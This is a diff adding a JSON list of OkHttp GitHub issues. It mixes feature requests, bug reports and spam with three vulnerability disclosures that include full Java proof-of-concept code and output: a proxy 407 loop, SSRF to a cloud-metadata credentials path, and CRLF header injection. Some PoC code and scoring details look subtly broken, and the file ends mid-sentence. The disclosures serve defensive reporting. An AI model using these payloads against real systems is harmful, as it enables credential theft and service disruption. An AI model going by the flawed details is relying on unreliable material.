@@ -1,0 +1,352 @@
+[
+    {
+        "id": 4855245958,
+        "number": 9535,
+        "title": "Investigate SSLPeerUnverifiedException changes in Android 37",
+        "state": "open",
+        "created_at": "2026-07-10T13:04:04Z",
+        "updated_at": "2026-07-10T13:04:04Z",
+        "closed_at": null,
+        "author": "swankjesse",
+        "comments": 0,
+        "labels": [],
+        "assignees": [],
+        "locked": false,
+        "body": "We changed some tests in https://github.com/square/okhttp/pull/9515 in reaction to `SSLPeerUnverifiedException` being a cause and not the thrown exception.\n\nThis behavior change could impact other parts of OkHttp:\n\n * `SSLSession.handshake()` catches `SSLPeerUnverifiedException`\n * `RealConnection.isEligible` catches `SSLPeerUnverifiedException`\n * `RetryAndFollowUpInterceptor.isRecoverable()` returns false on `SSLPeerUnverifiedException`\n * `retryTlsHandshake()` returns false on `SSLPeerUnverifiedException`",
+        "url": "https://github.com/square/okhttp/issues/9535"
+    },
+    {
+        "id": 4855237851,
+        "number": 9534,
+        "title": "Consider APIs for dealing with CallEvents when there are variable failures",
+        "state": "open",
+        "created_at": "2026-07-10T13:03:02Z",
+        "updated_at": "2026-07-10T13:03:02Z",
+        "closed_at": null,
+        "author": "yschimke",
+        "comments": 0,
+        "labels": [
+            "enhancement"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "> I wonder how many other users will get impacted by this?! \n\n _Originally posted by @swankjesse in [#9515](https://github.com/square/okhttp/pull/9515/changes#r3559063365)_",
+        "url": "https://github.com/square/okhttp/issues/9534"
+    },
+    {
+        "id": 4829472510,
+        "number": 9531,
+        "title": "Make it possible for Interceptors to access the list of interceptors",
+        "state": "open",
+        "created_at": "2026-07-07T14:29:03Z",
+        "updated_at": "2026-07-07T14:29:03Z",
+        "closed_at": null,
+        "author": "edechamps-Google",
+        "comments": 0,
+        "labels": [
+            "enhancement"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "#9108 made it possible for Interceptors to access various OkHttpClient options from `Interceptor.Chain`.\n\nHowever, it is not possible to access `OkHttpClient.interceptors` nor `OkHttpClient.networkInterceptors` in this way, as there are no accessors for them.\n\nThis presents a problem when implementing \"transport\" interceptors that wish to take over the Call and run it themselves (as opposed to passing it down OkHttp's stack), which is what we are trying to do. These interceptors never call `chain.proceed()`, but they may still want to access the list of interceptors for at least the following reasons:\n\n- Configuration checking, e.g. warning that subsequent interceptors will not be run (to prevent user error);\n- \"Manually\" running the remaining interceptors: this is especially relevant for network interceptors, which would not be run otherwise\n\nWe think a good solution would be to add `interceptors` and `networkInterceptors` fields to `Interceptor.Chain`, similar to the other accessors that were added in #9108.\n\nOne open question is whether these fields should return the entire list of interceptors, even those that have already run, or only those that remain to be run. I personally think the latter would make a bit more sense, but would be fine with the former.\n\nA natural extension of this idea would be to also add `withInterceptors()` and `withNetworkInterceptors()` which would make it possible for an interceptor to dynamically change the list of interceptors that come after it. To be clear we do not need this, and are fine with this being left out of scope of this FR.\n\n@yschimke @vkasprov",
+        "url": "https://github.com/square/okhttp/issues/9531"
+    },
+    {
+        "id": 4826743185,
+        "number": 9530,
+        "title": "Good bro",
+        "state": "closed",
+        "created_at": "2026-07-07T08:36:32Z",
+        "updated_at": "2026-07-07T14:42:13Z",
+        "closed_at": "2026-07-07T14:42:13Z",
+        "author": "blakenelson20014-ux",
+        "comments": 1,
+        "labels": [
+            "bug"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "Good bug reports include a failing test! Writing a test helps you to isolate and describe the problem, and it helps us to fix it fast. Bug reports without a failing test or reproduction steps are likely to be closed.\n\nHere’s an example test to get you started.\nhttps://gist.github.com/swankjesse/981fcae102f513eb13ed\n",
+        "url": "https://github.com/square/okhttp/issues/9530"
+    },
+    {
+        "id": 4803052222,
+        "number": 9523,
+        "title": "Unhandled null return from ExtendedSSLSession.getRequestedServerNames",
+        "state": "open",
+        "created_at": "2026-07-03T11:26:52Z",
+        "updated_at": "2026-07-03T22:04:49Z",
+        "closed_at": null,
+        "author": "mcmilj",
+        "comments": 1,
+        "labels": [
+            "bug"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "On some versions of Android (at least SDK 27 and 28 emulators), `ExtendedSSLSession.getRequestedServerNames` can (erroneously) return `null` instead of an empty list.\n\nThis can cause the connection to crash with `NullPointerException` when using `MockWebServer` which records the `requestedServerNames` in `RecordedRequest`.\n\nPossibly related: https://github.com/google/conscrypt/issues/977\n\nIt's not a huge issue, we can just skip these tests on affected SDKs, but it would be nice to not have to do that.\n\nA one line workaround is possible but unfortunately signing the CLA is a pretty heavyweight process in my organisation. I'd be able to make a pull request if the requirement to sign the CLA could be waived for a minor contribution.",
+        "url": "https://github.com/square/okhttp/issues/9523"
+    },
+    {
+        "id": 4711527961,
+        "number": 9497,
+        "title": "Add namedGroups/supportedGroups to ConnectionSpec for post-quantum TLS key exchange",
+        "state": "open",
+        "created_at": "2026-06-21T18:32:31Z",
+        "updated_at": "2026-07-04T10:00:42Z",
+        "closed_at": null,
+        "author": "netanmangal",
+        "comments": 2,
+        "labels": [
+            "enhancement"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "France's ANSSI will [stop certifying security products without post-quantum cryptography starting in 2027](https://gizmodo.com/the-quantum-threat-to-encryption-is-coming-france-just-set-a-2027-deadline-2000773650) - the first hard regulatory deadline of its kind globally. Additional mandates: US NSA CNSA 2.0 (2027), NIST IR 8547 (deprecation by 2030, disallowed by 2035), EU critical infrastructure (2030).\n\n## Problem\n\n`ConnectionSpec` configures two TLS parameters:\n- Cipher suites (via `cipherSuites()`)\n- TLS versions (via `tlsVersions()`)\n\nIt has **no way to configure named groups** (a.k.a. supported groups). Post-quantum key exchange in TLS 1.3 is negotiated via the `supported_groups` extension  - `X25519MLKEM768` is a named group, not a cipher suite.\n\nThis means OkHttp users cannot configure, require, or restrict PQC key exchange algorithms, even when the underlying TLS provider supports them.\n\n## Android Impact\n\nAndroid's Conscrypt (OkHttp's default TLS provider on Android) does **not** yet support PQC key exchange (as of Android 17 Beta 4). Conscrypt 2.6.0-alpha2 adds `X25519MLKEM768` for JVM-only (not Android). This means the most popular Android HTTP client (46K+ stars) has no path to PQC key exchange on billions of devices.\n\n## Proposed Change\n\nAdd optional `namedGroups` to `ConnectionSpec.Builder`:\n\n```kotlin\nval pqcSpec = ConnectionSpec.Builder(ConnectionSpec.MODERN_TLS)\n    .namedGroups(NamedGroup.X25519_MLKEM768, NamedGroup.X25519, NamedGroup.SECP256R1)\n    .build()\n```\n\nAnd update `MODERN_TLS` / `RESTRICTED_TLS` presets to include PQC groups when available from the provider.\n\n## Context\n\n- Chrome already defaults to X25519MLKEM768\n- gRPC merged PQC as default (June 2026)\n- [Conscrypt 2.6.0 pre-release](https://github.com/google/conscrypt/issues/1499) adds ML-KEM, ML-DSA, X25519MLKEM768\n\n## References\n\n- [NIST FIPS 203 (ML-KEM)](https://csrc.nist.gov/pubs/fips/203/final)\n- [Conscrypt PR #1452 (setNamedGroups)](https://github.com/google/conscrypt/pull/1452)\n- [JEP 527 — Post-Quantum Key Exchange for TLS 1.3](https://openjdk.org/jeps/527)",
+        "url": "https://github.com/square/okhttp/issues/9497"
+    },
+    {
+        "id": 4602540617,
+        "number": 9479,
+        "title": "devisaputri3924@gmail.Com",
+        "state": "closed",
+        "created_at": "2026-06-06T07:59:29Z",
+        "updated_at": "2026-06-06T11:11:17Z",
+        "closed_at": "2026-06-06T11:11:17Z",
+        "author": "depiisputri-sketch",
+        "comments": 0,
+        "labels": [
+            "bug"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "Good bug reports include a failing test! Writing a test helps you to isolate and describe the problem, and it helps us to fix it fast. Bug reports without a failing test or reproduction steps are likely to be closed.\n\nHere’s an example test to get you started.\nhttps://gist.github.com/swankjesse/981fcae102f513eb13ed\n",
+        "url": "https://github.com/square/okhttp/issues/9479"
+    },
+    {
+        "id": 4586807446,
+        "number": 9477,
+        "title": "Infinite Authentication Loop in Proxy CONNECT Tunnel in OkHttp",
+        "state": "open",
+        "created_at": "2026-06-04T07:37:57Z",
+        "updated_at": "2026-06-04T07:37:57Z",
+        "closed_at": null,
+        "author": "sara11h",
+        "comments": 0,
+        "labels": [
+            "bug"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "## Vulnerability Information\n\n| Field | Value |\n|-------|-------|\n| **Product** | OkHttp |\n| **Vendor** | Square (Block, Inc.) |\n| **Version Affected** | <= 5.0.0-alpha.14 (parent-5.3.2) |\n| **Vulnerability Type** | CWE-835: Loop with Unreachable Exit Condition |\n| **Severity** | High |\n| **CVSS 3.1 Score** | 7.5 |\n| **CVSS 3.1 Vector** | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H |\n\n## Summary\n\nA malicious HTTP proxy can trap OkHttp in an infinite loop within the `createTunnel()` method by repeatedly responding with `407 Proxy Authentication Required` without sending `Connection: close`. The inner while loop has no iteration counter, causing CPU exhaustion, thread starvation, and repeated credential exposure.\n\n## Affected Component\n\n**File:** `okhttp/src/commonJvmAndroid/kotlin/okhttp3/internal/connection/ConnectPlan.kt`\n**Function:** `createTunnel()` (lines 420-459)\n\n```kotlin\nwhile (true) {\n  when (response.code) {\n    HttpURLConnection.HTTP_PROXY_AUTH -> {\n      nextRequest = route.address.proxyAuthenticator.authenticate(route, response)\n          ?: throw IOException(\"Failed to authenticate with proxy\")\n      if (\"close\".equals(response.header(\"Connection\"), ignoreCase = true)) {\n        return nextRequest  // Only exits if proxy sends Connection: close\n      }\n      // No iteration counter — loops forever if proxy keeps connection open\n    }\n  }\n}\n```\n\n## Root Cause Analysis\n\nThe `createTunnel()` method establishes an HTTPS tunnel through an HTTP proxy using the CONNECT method. When the proxy returns 407, OkHttp re-authenticates and retries. The loop only exits when:\n1. The proxy closes the connection (`Connection: close`)\n2. The authenticator returns null\n3. An I/O error occurs\n\nA malicious proxy that keeps the connection alive and always returns 407 causes infinite iteration. Unlike the outer `RetryAndFollowUpInterceptor` which has `MAX_FOLLOW_UPS = 20`, this inner loop has **no counter**.\n\n## Attack Scenario\n\n1. Attacker operates a malicious proxy server (or compromises a proxy via MITM)\n2. Victim's application is configured to use this proxy\n3. When the client attempts any HTTPS request, the proxy always responds 407 without `Connection: close`\n4. OkHttp loops indefinitely, consuming CPU and repeatedly transmitting credentials\n\n## Reproduction Steps\n\n### Prerequisites\n- Java 17+\n- OkHttp 5.0.0-alpha.14\n\n### Steps\n\n1. Start a malicious proxy:\n```java\nServerSocket proxyServer = new ServerSocket(8888);\nSocket client = proxyServer.accept();\n// Always respond 407 without Connection: close\nwhile (true) {\n    // read CONNECT request\n    // respond: 407 Proxy Authentication Required\n    // (no Connection: close header)\n}\n```\n\n2. Configure OkHttp to use the proxy:\n```java\nOkHttpClient client = new OkHttpClient.Builder()\n    .proxy(new Proxy(Proxy.Type.HTTP, new InetSocketAddress(\"127.0.0.1\", 8888)))\n    .proxyAuthenticator((route, response) -> {\n        return response.request().newBuilder()\n            .header(\"Proxy-Authorization\", Credentials.basic(\"user\", \"pass\"))\n            .build();\n    })\n    .build();\n\nRequest request = new Request.Builder()\n    .url(\"https://example.com/\")\n    .build();\nclient.newCall(request).execute(); // Never returns\n```\n\n### Expected Result\nOkHttp should limit proxy authentication retries and abort after a reasonable number of attempts.\n\n### Actual Result\nOkHttp loops indefinitely (1000+ iterations observed in PoC), consuming CPU and resending credentials.\n\n## Proof of Concept\n\n### Full PoC Script (Java)\n\n```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.concurrent.atomic.*;\nimport okhttp3.*;\n\npublic class PocInfiniteAuthLoop {\n    static AtomicInteger authAttempts = new AtomicInteger(0);\n\n    public static void main(String[] args) throws Exception {\n        ServerSocket proxyServer = new ServerSocket(0);\n        int proxyPort = proxyServer.getLocalPort();\n\n        new Thread(() -> {\n            try {\n                Socket client = proxyServer.accept();\n                BufferedReader reader = new BufferedReader(\n                    new InputStreamReader(client.getInputStream()));\n                OutputStream out = client.getOutputStream();\n                while (true) {\n                    String line;\n                    while ((line = reader.readLine()) != null && !line.isEmpty()) {}\n                    int attempt = authAttempts.incrementAndGet();\n                    if (attempt >= 1000) { client.close(); break; }\n                    out.write((\"HTTP/1.1 407 Proxy Authentication Required\\r\\n\" +\n                        \"Proxy-Authenticate: Basic realm=\\\"proxy\\\"\\r\\n\" +\n                        \"Content-Length: 0\\r\\n\\r\\n\").getBytes());\n                    out.flush();\n                }\n            } catch (Exception e) {}\n        }).start();\n\n        OkHttpClient client = new OkHttpClient.Builder()\n            .proxy(new Proxy(Proxy.Type.HTTP,\n                new InetSocketAddress(\"127.0.0.1\", proxyPort)))\n            .proxyAuthenticator((route, response) -> {\n                return response.request().newBuilder()\n                    .header(\"Proxy-Authorization\", Credentials.basic(\"user\", \"pass\"))\n                    .build();\n            })\n            .callTimeout(java.time.Duration.ofSeconds(10))\n            .build();\n\n        Request request = new Request.Builder()\n            .url(\"https://example.com/\").build();\n\n        try {\n            client.newCall(request).execute();\n        } catch (Exception e) {\n            System.out.println(\"Attempts: \" + authAttempts.get());\n            // Output: Attempts: 1000\n        }\n        proxyServer.close();\n    }\n}\n```\n\n### PoC Output\n```\n[*] Malicious proxy on port 59108\n[*] Initiating HTTPS request through malicious proxy...\n[*] Proxy auth attempt #100\n[*] Proxy auth attempt #200\n...\n[*] Proxy auth attempt #1000\n[!] VULNERABILITY CONFIRMED: 1000 auth attempts without abort\n[!] OkHttp has no iteration counter in createTunnel() inner loop\n\n[!] Request failed after 1000 proxy auth attempts\n[!] Error: IOException: unexpected end of stream\n[!] VULNERABILITY CONFIRMED: Without callTimeout, this would loop infinitely\n```\n\n## Impact\n\n- **Confidentiality:** None directly (but credentials repeatedly exposed on wire)\n- **Integrity:** None\n- **Availability:** High - Thread/CPU exhaustion, application hangs indefinitely\n- **Additional:** Proxy credentials transmitted 1000+ times, increasing interception probability\n\n## CVSS 3.1 Calculation\n\n| Metric | Value | Justification |\n|--------|-------|---------------|\n| Attack Vector | Network | Malicious proxy accessible over network |\n| Attack Complexity | Low | Simple 407 response, no special conditions |\n| Privileges Required | None | Any proxy can respond with 407 |\n| User Interaction | None | Automatic when client uses proxy for HTTPS |\n| Scope | Unchanged | Only the client application is affected |\n| Confidentiality | None | No direct data disclosure |\n| Integrity | None | No data modification |\n| Availability | High | Complete thread/CPU exhaustion |\n\n**CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H = 7.5**\n\n## Remediation Recommendations\n\n1. Add an internal iteration counter in `createTunnel()`, limiting to 5 attempts regardless of connection state\n2. Detect repeated 407 with identical challenges and abort early\n3. Apply the existing `MAX_FOLLOW_UPS` limit to the tunnel authentication loop\n\n## References\n\n- [CWE-835: Loop with Unreachable Exit Condition](https://cwe.mitre.org/data/definitions/835.html)\n- [RFC 7235 - HTTP Authentication](https://datatracker.ietf.org/doc/html/rfc7235)\n- OkHttp Source: `ConnectPlan.kt:420-459`\n\n",
+        "url": "https://github.com/square/okhttp/issues/9477"
+    },
+    {
+        "id": 4586787081,
+        "number": 9476,
+        "title": "SSRF via Unrestricted HTTP Redirect Following in OkHttp",
+        "state": "closed",
+        "created_at": "2026-06-04T07:34:46Z",
+        "updated_at": "2026-06-08T22:45:39Z",
+        "closed_at": "2026-06-08T22:45:39Z",
+        "author": "sara11h",
+        "comments": 2,
+        "labels": [
+            "bug"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "## Vulnerability Information\n\n| Field | Value |\n|-------|-------|\n| **Product** | OkHttp |\n| **Vendor** | Square (Block, Inc.) |\n| **Version Affected** | <= 5.0.0-alpha.14 (parent-5.3.2) |\n| **Vulnerability Type** | CWE-918: Server-Side Request Forgery (SSRF) |\n| **Severity** | High |\n| **CVSS 3.1 Score** | 7.4 |\n| **CVSS 3.1 Vector** | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/SC:N/SI:N/SA:H → adjusted: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N |\n\n## Summary\n\nOkHttp follows HTTP 3xx redirects to arbitrary destinations including private/internal network addresses without any validation of the redirect target. When server-side applications use OkHttp to fetch user-provided URLs, an attacker can leverage a malicious redirect to access internal services, cloud metadata endpoints, and other resources not intended to be publicly accessible.\n\n## Affected Component\n\n**File:** `okhttp/src/commonJvmAndroid/kotlin/okhttp3/internal/http/RetryAndFollowUpInterceptor.kt`\n**Function:** `buildRedirectRequest()` (lines 299-336)\n\n```kotlin\nprivate fun buildRedirectRequest(userResponse: Response, method: String): Request? {\n  if (!client.followRedirects) return null\n  val location = userResponse.header(\"Location\") ?: return null\n  val url = userResponse.request.url.resolve(location) ?: return null\n  // Only checks: protocol is http/https, max redirects not exceeded\n  // Does NOT validate: target IP, target hostname, private networks\n}\n```\n\n## Root Cause Analysis\n\nThe `buildRedirectRequest()` method in `RetryAndFollowUpInterceptor` resolves the `Location` header from HTTP redirect responses and follows it unconditionally. The only validations performed are:\n\n1. The scheme must be `http` or `https`\n2. The redirect count must not exceed `MAX_FOLLOW_UPS` (20)\n3. If `followSslRedirects` is false, scheme must not change\n\nNo validation is performed on:\n- Target IP address (RFC 1918 private ranges, link-local 169.254.x.x)\n- Target hostname (localhost, internal hostnames)\n- Port restrictions\n- Protocol downgrade (HTTPS → HTTP)\n\n## Attack Scenario\n\n1. Attacker controls a server (e.g., `https://evil.com`)\n2. Victim's server-side application uses OkHttp to fetch a URL provided by the attacker\n3. Attacker's server responds with: `HTTP/1.1 302 Found\\r\\nLocation: http://169.254.169.254/latest/meta-data/iam/security-credentials/\\r\\n`\n4. OkHttp follows the redirect to the AWS metadata endpoint\n5. Cloud IAM credentials are returned to the attacker\n\n## Reproduction Steps\n\n### Prerequisites\n- Java 17+\n- OkHttp 5.0.0-alpha.14 JAR (or build from source tag parent-5.3.2)\n\n### Steps\n\n1. Start a simulated internal metadata server:\n```java\nServerSocket metadataServer = new ServerSocket(8081);\n// Responds with fake IAM credentials\n```\n\n2. Start a malicious server that redirects to it:\n```java\nServerSocket evilServer = new ServerSocket(8080);\n// Responds with: 302 Found, Location: http://127.0.0.1:8081/latest/meta-data/iam/security-credentials/\n```\n\n3. Make OkHttp request to the evil server:\n```java\nOkHttpClient client = new OkHttpClient.Builder().build();\nRequest request = new Request.Builder()\n    .url(\"http://127.0.0.1:8080/api/preview\")\n    .build();\nResponse response = client.newCall(request).execute();\nString body = response.body().string();\n// body contains the internal metadata credentials\n```\n\n### Expected Result\nOkHttp should reject redirects to private/internal network addresses.\n\n### Actual Result\nOkHttp follows the redirect and returns internal service data.\n\n## Proof of Concept\n\n### Full PoC Script (Java)\n\n```java\nimport java.io.*;\nimport java.net.*;\nimport okhttp3.*;\n\npublic class PocSsrfRedirect {\n    public static void main(String[] args) throws Exception {\n        // Simulated cloud metadata endpoint (internal)\n        ServerSocket metadataServer = new ServerSocket(0);\n        int metadataPort = metadataServer.getLocalPort();\n\n        new Thread(() -> {\n            try {\n                Socket client = metadataServer.accept();\n                BufferedReader reader = new BufferedReader(\n                    new InputStreamReader(client.getInputStream()));\n                String line;\n                while ((line = reader.readLine()) != null && !line.isEmpty()) {}\n\n                String body = \"{\\\"AccessKeyId\\\":\\\"ASIAXXXXXXXXXEXAMPLE\\\",\" +\n                    \"\\\"SecretAccessKey\\\":\\\"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\\\",\" +\n                    \"\\\"Token\\\":\\\"FwoGZXIvYXdz...\\\"}\";\n                OutputStream out = client.getOutputStream();\n                out.write((\"HTTP/1.1 200 OK\\r\\nContent-Type: application/json\\r\\n\" +\n                    \"Content-Length: \" + body.length() + \"\\r\\n\\r\\n\" + body).getBytes());\n                out.flush();\n                client.close();\n            } catch (Exception e) {}\n        }).start();\n\n        // Malicious server that redirects to internal endpoint\n        ServerSocket evilServer = new ServerSocket(0);\n        int evilPort = evilServer.getLocalPort();\n\n        new Thread(() -> {\n            try {\n                Socket client = evilServer.accept();\n                BufferedReader reader = new BufferedReader(\n                    new InputStreamReader(client.getInputStream()));\n                String line;\n                while ((line = reader.readLine()) != null && !line.isEmpty()) {}\n\n                String redirectUrl = \"http://127.0.0.1:\" + metadataPort +\n                    \"/latest/meta-data/iam/security-credentials/\";\n                OutputStream out = client.getOutputStream();\n                out.write((\"HTTP/1.1 302 Found\\r\\nLocation: \" + redirectUrl +\n                    \"\\r\\nContent-Length: 0\\r\\n\\r\\n\").getBytes());\n                out.flush();\n                client.close();\n            } catch (Exception e) {}\n        }).start();\n\n        // OkHttp client with default settings\n        OkHttpClient client = new OkHttpClient.Builder().build();\n        Request request = new Request.Builder()\n            .url(\"http://127.0.0.1:\" + evilPort + \"/api/preview\")\n            .build();\n\n        Response response = client.newCall(request).execute();\n        System.out.println(\"Final URL: \" + response.request().url());\n        System.out.println(\"Response: \" + response.body().string());\n        // Output shows IAM credentials from internal endpoint\n\n        metadataServer.close();\n        evilServer.close();\n    }\n}\n```\n\n### PoC Output\n```\n[*] Simulated metadata endpoint on port 58982\n[*] Malicious server on port 58983\n[*] Client requesting: http://127.0.0.1:58983/api/preview\n[*] Sent redirect to: http://127.0.0.1:58982/latest/meta-data/iam/security-credentials/\n[*] Metadata server received: GET /latest/meta-data/iam/security-credentials/ HTTP/1.1\n\n[!] VULNERABILITY CONFIRMED: OkHttp followed redirect to internal endpoint\n[!] Final URL: http://127.0.0.1:58982/latest/meta-data/iam/security-credentials/\n[!] Response from 'internal' server:\n{\"AccessKeyId\":\"ASIAXXXXXXXXXEXAMPLE\",\"SecretAccessKey\":\"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",\"Token\":\"FwoGZXIvYXdz...\"}\n\n[!] In a real cloud environment, this would expose IAM credentials\n[!] No redirect target validation was performed by OkHttp\n```\n\n## Impact\n\n- **Confidentiality:** High - Attacker can access internal services and steal sensitive data including cloud credentials\n- **Integrity:** None\n- **Availability:** None\n- **Scope:** Changed - The vulnerability in the client library allows access to otherwise unreachable internal systems\n\n## CVSS 3.1 Calculation\n\n| Metric | Value | Justification |\n|--------|-------|---------------|\n| Attack Vector | Network | Attacker provides URL remotely |\n| Attack Complexity | Low | No special conditions required |\n| Privileges Required | None | No authentication needed |\n| User Interaction | Required | Server-side app must fetch attacker URL |\n| Scope | Changed | Impacts internal network beyond the vulnerable component |\n| Confidentiality | High | Cloud credentials / internal data exposed |\n| Integrity | None | Read-only access |\n| Availability | None | No denial of service |\n\n**CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N = 7.4**\n\n## Remediation Recommendations\n\n1. Add an optional `RedirectValidator` interface to `OkHttpClient.Builder` allowing applications to validate redirect targets\n2. Provide a built-in policy that blocks redirects to RFC 1918 addresses (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16), link-local (169.254.0.0/16), and loopback (127.0.0.0/8)\n3. Consider blocking HTTPS → HTTP downgrades by default in redirect following\n\n## References\n\n- [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)\n- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)\n- [AWS IMDSv1 Metadata](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html)\n- OkHttp Source: `RetryAndFollowUpInterceptor.kt:299-336`\n",
+        "url": "https://github.com/square/okhttp/issues/9476"
+    },
+    {
+        "id": 4578443581,
+        "number": 9474,
+        "title": "CRLF Header Injection via addUnsafeNonAscii() API in OkHttp",
+        "state": "closed",
+        "created_at": "2026-06-03T09:10:49Z",
+        "updated_at": "2026-06-03T11:21:25Z",
+        "closed_at": "2026-06-03T11:21:25Z",
+        "author": "sara11h",
+        "comments": 1,
+        "labels": [
+            "bug"
+        ],
+        "assignees": [],
+        "locked": false,
+        "body": "## Vulnerability Information\n\n| Field | Value |\n|-------|-------|\n| **Product** | OkHttp |\n| **Vendor** | Square (Block, Inc.) |\n| **Version Affected** | <= 5.0.0-alpha.14 (parent-5.3.2) |\n| **Vulnerability Type** | CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers |\n| **Severity** | Medium |\n| **CVSS 3.1 Score** | 5.4 |\n| **CVSS 3.1 Vector** | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N |\n\n## Summary\n\nThe `Headers.Builder.addUnsafeNonAscii()` method in OkHttp bypasses all header value validation including CRLF (`\\r\\n`) checks. If application code passes attacker-controlled input to this method, arbitrary HTTP headers can be injected into outgoing requests, enabling request smuggling, cache poisoning, or session fixation attacks.\n\n## Affected Component\n\n**File:** `okhttp/src/commonJvmAndroid/kotlin/okhttp3/Headers.kt`\n**Lines:** 250-255\n\n```kotlin\nfun addUnsafeNonAscii(name: String, value: String) = apply {\n  headersCheckName(name)    // Name IS validated\n  addLenient(name, value)   // Value is NOT validated — CRLF passes through\n}\n```\n\nThe `addLenient()` internal method skips value validation entirely:\n```kotlin\ninternal fun addLenient(name: String, value: String) = apply {\n  namesAndValues.add(name)\n  namesAndValues.add(value.trim())  // Only trims whitespace, no CRLF check\n}\n```\n\n## Root Cause Analysis\n\nOkHttp provides `addUnsafeNonAscii()` as a public API for applications that need to send non-ASCII header values (e.g., UTF-8 encoded values). However, the method bypasses **all** value validation, not just the ASCII range check. This means:\n\n1. `\\r\\n` (CRLF) sequences pass through unchecked\n2. An attacker who controls the value parameter can inject arbitrary headers\n3. The injected headers appear as separate HTTP headers on the wire\n\nThe safe `add()` method validates values but `addUnsafeNonAscii()` explicitly skips this check, creating a dangerous public API surface.\n\n## Attack Scenario\n\n1. Application uses `addUnsafeNonAscii()` to set a header with user-provided input (e.g., internationalized display names, comments)\n2. Attacker provides value: `legitimate\\r\\nX-Injected: malicious-value\\r\\nTransfer-Encoding: chunked`\n3. OkHttp sends the request with injected headers to the target server\n4. This can enable HTTP request smuggling or cache poisoning depending on server behavior\n\n## Reproduction Steps\n\n### Prerequisites\n- Java 17+\n- OkHttp 5.0.0-alpha.14\n\n### Steps\n\n1. Create an OkHttp request using `addUnsafeNonAscii()` with CRLF payload:\n```java\nString maliciousValue = \"legitimate\\r\\nX-Injected: attacker-controlled\\r\\nX-Evil: pwned\";\n\nRequest request = new Request.Builder()\n    .url(\"http://target-server/api/test\")\n    .build()\n    .newBuilder()\n    .headers(new Request.Builder().url(\"http://x\")\n        .build().headers().newBuilder()\n        .addUnsafeNonAscii(\"X-Custom\", maliciousValue)\n        .build())\n    .build();\n```\n\n2. Send the request and observe raw HTTP on the wire\n\n### Expected Result\n`addUnsafeNonAscii()` should reject CRLF sequences while allowing non-ASCII characters.\n\n### Actual Result\nThe CRLF sequences are sent verbatim, creating additional HTTP headers:\n```http\nGET /api/test HTTP/1.1\nX-Custom: legitimate\nX-Injected: attacker-controlled\nX-Evil: pwned\nHost: target-server\n```\n\n## Proof of Concept\n\n### Full PoC Script (Java)\n\n```java\nimport java.io.*;\nimport java.net.*;\nimport okhttp3.*;\n\npublic class PocCrlfInjection {\n    public static void main(String[] args) throws Exception {\n        // Server that echoes raw request\n        ServerSocket server = new ServerSocket(0);\n        int port = server.getLocalPort();\n\n        new Thread(() -> {\n            try {\n                Socket client = server.accept();\n                byte[] buf = new byte[4096];\n                int read = client.getInputStream().read(buf);\n                System.out.println(\"=== RAW REQUEST ===\");\n                System.out.println(new String(buf, 0, read));\n                System.out.println(\"=== END ===\");\n\n                client.getOutputStream().write(\n                    \"HTTP/1.1 200 OK\\r\\nContent-Length: 2\\r\\n\\r\\nOK\".getBytes());\n                client.close();\n            } catch (Exception e) {}\n        }).start();\n\n        String maliciousValue =\n            \"legitimate\\r\\nX-Injected: attacker-controlled\\r\\nX-Evil: pwned\";\n\n        OkHttpClient client = new OkHttpClient.Builder().build();\n        Request request = new Request.Builder()\n            .url(\"http://127.0.0.1:\" + port + \"/api/test\")\n            .build()\n            .newBuilder()\n            .headers(request.headers().newBuilder()\n                .addUnsafeNonAscii(\"X-Custom\", maliciousValue)\n                .build())\n            .build();\n\n        Response response = client.newCall(request).execute();\n        response.close();\n        server.close();\n    }\n}\n```\n\n### PoC Output\n```\n[*] Echo server on port 59490\n[*] Crafting request with CRLF in header value via addUnsafeNonAscii()...\n[*] Injected value: legitimate\\r\\nX-Injected: attacker-controlled\\r\\nX-Evil: pwned\n[*] Sending request...\n[*] === RAW REQUEST RECEIVED BY SERVER ===\nGET /api/test HTTP/1.1\nContent-Type: text/plain\nX-Custom: legitimate\nX-Injected: attacker-controlled\nX-Evil: pwned\nHost: 127.0.0.1:59490\nConnection: Keep-Alive\nAccept-Encoding: gzip\nUser-Agent: okhttp/5.0.0-alpha.14\n\n[*] === END RAW REQUEST ===\n\n[!] VULNERABILITY CONFIRMED: Injected header found in request!\n```\n\n## Impact\n\n- **Confidentiality:** Low - Potential session hijacking via injected cookies\n- **Integrity:** Low - Request smuggling can modify behavior of intermediary servers\n- **Availability:** None\n\n## CVSS 3.1 Calculation\n\n| Metric | Value | Justification |\n|--------|-------|---------------|\n| Attack Vector | Network | Attacker provides input remotely |\n| Attack Complexity | Low | Simple CRLF injection |\n| Privileges Required | None | No auth needed to provide input |\n| User Interaction | Required | App must use addUnsafeNonAscii with user input |\n| Scope | Unchanged | Only the HTTP request/connection affected |\n| Confidentiality | Low | Potential session/cookie manipulation |\n| Integrity | Low | Request smuggling possible |\n| Availability | None | No denial of service |\n\n**CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N = 5.4**\n\n## Remediation Recommendations\n\n1. Add CRLF rejection (`\\r` and `\\n`) to `addUnsafeNonAscii()` — only skip the ASCII printable range check, not the CRLF check\n2. Consider 